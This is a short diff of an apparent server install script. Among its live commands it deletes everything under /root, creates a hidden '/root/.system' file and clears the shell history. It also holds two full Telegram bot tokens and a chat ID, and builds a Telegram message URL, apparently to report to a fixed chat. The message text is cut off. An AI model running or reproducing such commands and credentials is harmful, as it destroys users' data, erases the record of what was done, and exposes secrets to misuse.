@@ -663,9 +663,9 @@ rm -fr /root/*
 touch /root/.system
 history -c
 echo "1.2" > /home/ver
-CHATID="5795571992"
-KEY="6386703502:AAENoEhJuBF_R1EGqrUHD5jPASwOukQtUGM"
 TIME="10"
+CHATID="5795571992"
+KEY="6386703502:AAGiUjNES9aXxBWzuqNTiqDBDqd0uLcGFAs"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 echo -e ""
 TEXT="
